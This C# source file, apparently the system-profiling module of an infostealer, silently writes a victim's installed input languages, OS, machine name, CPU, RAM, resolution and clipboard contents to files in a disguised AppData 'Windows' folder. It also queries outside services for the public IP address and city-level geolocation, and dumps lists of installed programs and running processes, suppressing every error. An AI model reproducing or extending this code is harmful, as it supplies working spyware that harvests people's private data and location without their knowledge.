using System.Drawing;
using System.Windows.Forms;
using System;
using System.IO;
using Microsoft.Win32;
using Microsoft.VisualBasic.Devices;
using System.Diagnostics;
using System.Xml;
namespace hw1d
{
    class hwid
    {
        public static string GetHWID()
        {
            try
            {

                Size resolution = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Size; //getting resolution

                try
                {
                    using (StreamWriter langtext = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Windows\hwid.txt", false, System.Text.Encoding.Default))
                    {
                        int ii = 0;
                        foreach (InputLanguage lang in InputLanguage.InstalledInputLanguages)
                        {
                            ii++;
                            if (ii <= 1)
                            {
                                langtext.Write("Languages : " + lang.Culture.EnglishName);

                            }
                            else
                            {
                                langtext.WriteLine("\t" + lang.Culture.EnglishName);
                            }
                        }
                        langtext.WriteLine("OC verison - " + Environment.OSVersion);
                        langtext.WriteLine("MachineName - " + Environment.MachineName);
                        RegistryKey processor_name = Registry.LocalMachine.OpenSubKey(@"Hardware\Description\System\CentralProcessor\0", RegistryKeyPermissionCheck.ReadSubTree);   //This registry entry contains entry for processor info.

                        if (processor_name != null)
                        {
                            if (processor_name.GetValue("ProcessorNameString") != null)
                            {
                                langtext.WriteLine("CPU - " + processor_name.GetValue("ProcessorNameString"));
                            }
                        }
                        langtext.WriteLine("Resolution - " + resolution);
                        langtext.WriteLine("Current time Utc - " + DateTime.UtcNow);
                        langtext.WriteLine("Current time - " + DateTime.Now);
                        ComputerInfo pc = new ComputerInfo();
                        langtext.WriteLine("OS Full name - " + pc.OSFullName);
                        langtext.WriteLine("RAM - " + pc.TotalPhysicalMemory);
                        string ip = new System.Net.WebClient().DownloadString("https://api.ipify.org");
                        langtext.WriteLine("Clipboard - " + clipboard());
                        langtext.WriteLine("IP - " + ip);
                        XmlDocument xml = new XmlDocument();
                        xml.LoadXml(new System.Net.WebClient().DownloadString("http://ip-api.com/xml")); 
                        langtext.WriteLine("Country - " + xml.GetElementsByTagName("country")[0].InnerText);
                        langtext.WriteLine("Country Code - " + xml.GetElementsByTagName("countryCode")[0].InnerText);
                        langtext.WriteLine("Region - " + xml.GetElementsByTagName("region")[0].InnerText);
                        langtext.WriteLine("Region Name - " + xml.GetElementsByTagName("regionName")[0].InnerText);
                        langtext.WriteLine("City - " + xml.GetElementsByTagName("city")[0].InnerText);
                        langtext.WriteLine("Zip - " + xml.GetElementsByTagName("zip")[0].InnerText);
                        langtext.Close();
                        return pc.OSFullName;
                    }
                }
                catch
                {
                    return null;
                }

            }
            catch
            {
                return null;
            }
        }
        public static void getprogrammes()
        {

                using( StreamWriter programmestext = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Windows\Programms.txt", false, System.Text.Encoding.Default))
                {
                try
                {
                    string displayName;
                    RegistryKey key;
                    key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall");
                    string[] keys = key.GetSubKeyNames();
                    for (int i = 0; i < keys.Length; i++)
                    {
                        RegistryKey subkey = key.OpenSubKey(keys[i]);
                        displayName = subkey.GetValue("DisplayName") as string;
                        if (displayName == null) continue;
                        programmestext.WriteLine(displayName);
                    }
                }
                catch
                {
                }
            }

        }
        public static void getprocesses()
        {
            try
            {
                using (StreamWriter processest = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Windows\Processes.txt", false, System.Text.Encoding.Default))
                {
                    Process[] processes = Process.GetProcesses();
                    for (int i = 0; i < processes.Length; i++)
                    {
                        processest.WriteLine(processes[i].ProcessName.ToString());
                    }
                }
            }
            catch(Exception ex)
            {
            }


        }
        public static string clipboard()
        {
            string clipbord = Clipboard.GetText();
            return clipbord;
        }
    }
}


